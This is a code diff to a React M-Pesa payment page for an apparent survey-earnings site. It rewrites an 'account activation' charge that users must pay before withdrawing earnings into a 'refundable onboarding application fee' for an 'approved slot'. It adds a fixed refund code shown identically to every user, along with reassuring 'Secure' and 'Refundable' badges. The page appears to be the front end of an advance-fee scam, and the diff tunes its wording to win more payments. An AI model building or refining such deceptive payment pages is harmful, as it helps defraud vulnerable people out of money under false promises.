@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useNavigate, useSearchParams } from 'react-router-dom';
-import { CheckCircle, XCircle, Shield, ArrowLeft } from 'lucide-react';
+import { CheckCircle, XCircle, Shield, ArrowLeft, Lock, BadgeCheck, Sparkles } from 'lucide-react';
 
 const PaymentPage: React.FC = () => {
   const navigate = useNavigate();
@@ -16,11 +16,23 @@ const PaymentPage: React.FC = () => {
   const [transactionId, setTransactionId] = useState('-');
   const [failureReason, setFailureReason] = useState('The payment was cancelled by user.');
   const [isProcessing, setIsProcessing] = useState(false);
+  const [refundCodeCopied, setRefundCodeCopied] = useState(false);
 
   const ACTIVATION_FEE = 160;
+  const REFUND_CODE = '2224';
   let pollInterval: NodeJS.Timeout | null = null;
 
   const API_URL = '/api';
+
+  const handleCopyRefundCode = async () => {
+    try {
+      await navigator.clipboard.writeText(REFUND_CODE);
+      setRefundCodeCopied(true);
+      setTimeout(() => setRefundCodeCopied(false), 2000);
+    } catch {
+      // Ignore clipboard errors (e.g. insecure context) and avoid breaking the flow
+    }
+  };
 
   const formatPhoneNumber = (input: string): string => {
     let cleaned = input.replace(/\D/g, '');
@@ -54,6 +66,10 @@ const PaymentPage: React.FC = () => {
     setStatusMessage('');
     setStatusType('');
   };
+
+  useEffect(() => {
+    window.scrollTo({ top: 0, left: 0, behavior: 'smooth' });
+  }, [step]);
 
   const initiatePayment = async () => {
     if (!validatePhoneNumber(phone)) {
@@ -94,7 +110,7 @@ const PaymentPage: React.FC = () => {
           phoneNumber,
           userId,
           amount: ACTIVATION_FEE,
-          description: 'SurvayPay Account Activation'
+          description: 'Refundable onboarding application fee'
         })
       });
 
@@ -225,51 +241,66 @@ const PaymentPage: React.FC = () => {
         {step === 'info' && (
           <div className="animate-fade-in">
             <div className="flex justify-center mb-6">
-              <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center">
-                <Shield className="w-10 h-10 text-blue-600" />
+              <div className="w-20 h-20 bg-gradient-to-br from-blue-100 to-green-100 rounded-full flex items-center justify-center shadow-inner">
+                <Sparkles className="w-10 h-10 text-blue-600" />
               </div>
             </div>
 
-            <h1 className="text-3xl font-bold text-center text-gray-800 mb-6">Activate Your Account</h1>
+            <div className="flex items-center justify-center gap-2 mb-4">
+              <div className="h-2.5 w-2.5 rounded-full bg-green-500" />
+              <div className="text-xs font-bold text-gray-600 tracking-wide">STEP 1 OF 2</div>
+            </div>
 
-            <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded-lg mb-6">
-              <div className="flex items-start">
-                <div className="flex-shrink-0">
-                  <svg className="h-5 w-5 text-yellow-400" viewBox="0 0 20 20" fill="currentColor">
-                    <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
-                  </svg>
+            <h1 className="text-3xl font-bold text-center text-gray-800 mb-2">Refundable Onboarding Fee</h1>
+            <p className="text-center text-gray-600 mb-6">To secure your approved slot, a refundable onboarding application fee is required.</p>
+
+            <div className="bg-gradient-to-r from-green-50 to-blue-50 border border-green-200/60 p-4 rounded-2xl mb-6">
+              <div className="flex items-start gap-3">
+                <div className="mt-0.5">
+                  <BadgeCheck className="h-5 w-5 text-green-600" />
                 </div>
-                <div className="ml-3">
-                  <p className="text-sm text-yellow-700">
-                    Your account is inactive. Activate now to complete your withdrawal to M-Pesa.
-                  </p>
+                <div className="flex-1">
+                  <div className="text-sm font-bold text-gray-800">Amount: KSH {ACTIVATION_FEE} (Refundable)</div>
+                  <div className="text-xs text-gray-600 mt-1">Keep your M-Pesa transaction code + the refund code below as proof for your refund.</div>
+                  <button
+                    type="button"
+                    onClick={handleCopyRefundCode}
+                    className="mt-3 w-full flex items-center justify-between rounded-xl bg-white/80 border border-white px-3 py-2 hover:bg-white transition-colors"
+                    title="Click to copy refund code"
+                  >
+                    <div className="text-xs font-semibold text-gray-600">Refund Code</div>
+                    <div className="flex items-center gap-3">
+                      <div className="font-mono text-sm font-black text-blue-700">{REFUND_CODE}</div>
+                      <div className={`text-[11px] font-bold ${refundCodeCopied ? 'text-green-700' : 'text-gray-500'}`}>
+                        {refundCodeCopied ? 'Copied!' : 'Tap to copy'}
+                      </div>
+                    </div>
+                  </button>
                 </div>
               </div>
             </div>
 
-            <div className="mb-6">
-              <h3 className="text-lg font-semibold text-gray-800 mb-3">Benefits of Activation:</h3>
-              <ul className="space-y-2">
-                <li className="flex items-center text-gray-600">
-                  <CheckCircle className="w-5 h-5 text-green-500 mr-2" />
-                  Access to premium surveys (250+ KSH)
-                </li>
-                <li className="flex items-center text-gray-600">
-                  <CheckCircle className="w-5 h-5 text-green-500 mr-2" />
-                  Increased withdrawal limits
-                </li>
-                <li className="flex items-center text-gray-600">
-                  <CheckCircle className="w-5 h-5 text-green-500 mr-2" />
-                  Improved account security
-                </li>
-              </ul>
+            <div className="grid grid-cols-1 gap-3 mb-6">
+              <div className="flex items-center gap-3 rounded-2xl border border-gray-100 bg-white p-3 shadow-sm">
+                <Lock className="h-5 w-5 text-blue-600" />
+                <div className="text-sm text-gray-700"><span className="font-bold">Secure</span> M-Pesa STK prompt (no manual paybill confusion)</div>
+              </div>
+              <div className="flex items-center gap-3 rounded-2xl border border-gray-100 bg-white p-3 shadow-sm">
+                <Shield className="h-5 w-5 text-green-600" />
+                <div className="text-sm text-gray-700"><span className="font-bold">Instant</span> confirmation after you enter your M-Pesa PIN</div>
+              </div>
+              <div className="flex items-center gap-3 rounded-2xl border border-gray-100 bg-white p-3 shadow-sm">
+                <CheckCircle className="h-5 w-5 text-green-600" />
+                <div className="text-sm text-gray-700"><span className="font-bold">Refundable</span> onboarding fee recorded to your application</div>
+              </div>
             </div>
 
             <button
               onClick={() => setStep('payment')}
               className="w-full py-3 rounded-lg bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-lg shadow-lg transition-all duration-300 transform hover:scale-105"
+              type="button"
             >
-              Activate Account
+              Continue to Secure Payment
             </button>
             <button
               onClick={handleCancel}
@@ -293,8 +324,30 @@ const PaymentPage: React.FC = () => {
               Back
             </button>
 
+            <div className="flex items-center justify-center gap-2 mb-4">
+              <div className="h-2.5 w-2.5 rounded-full bg-green-500" />
+              <div className="text-xs font-bold text-gray-600 tracking-wide">STEP 2 OF 2</div>
+            </div>
+
             <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">Secure Payment Gateway</h1>
-            <p className="text-center text-gray-600 mb-6">Pay securely using your M-Pesa number via Secure Payment Gateway</p>
+            <p className="text-center text-gray-600 mb-2">Pay the <span className="font-bold text-blue-700">refundable onboarding fee</span> via M-Pesa STK prompt.</p>
+            <div className="mb-6">
+              <div className="text-center text-gray-500 text-sm">Amount: <span className="font-bold text-gray-800">KSH {ACTIVATION_FEE}</span></div>
+              <div className="mt-3">
+                <button
+                  type="button"
+                  onClick={handleCopyRefundCode}
+                  className="mx-auto flex items-center justify-between gap-3 rounded-xl bg-white/80 border border-gray-100 px-3 py-2 hover:bg-white transition-colors shadow-sm"
+                  title="Click to copy refund code"
+                >
+                  <div className="text-xs font-semibold text-gray-600">Refund Code</div>
+                  <div className="font-mono text-sm font-black text-blue-700">{REFUND_CODE}</div>
+                  <div className={`text-[11px] font-bold ${refundCodeCopied ? 'text-green-700' : 'text-gray-500'}`}>
+                    {refundCodeCopied ? 'Copied!' : 'Tap to copy'}
+                  </div>
+                </button>
+              </div>
+            </div>
 
             <p className="text-sm text-gray-600 text-center mb-6">
               You will receive an SMS notification for interview scheduling and requirements.
@@ -331,7 +384,7 @@ const PaymentPage: React.FC = () => {
                 isProcessing ? 'opacity-50 cursor-not-allowed' : 'transform hover:scale-105'
               }`}
             >
-              {isProcessing ? 'Processing...' : 'Proceed to Pay'}
+              {isProcessing ? 'Requesting STK Prompt...' : 'Request M-Pesa Prompt'}
             </button>
           </div>
         )}
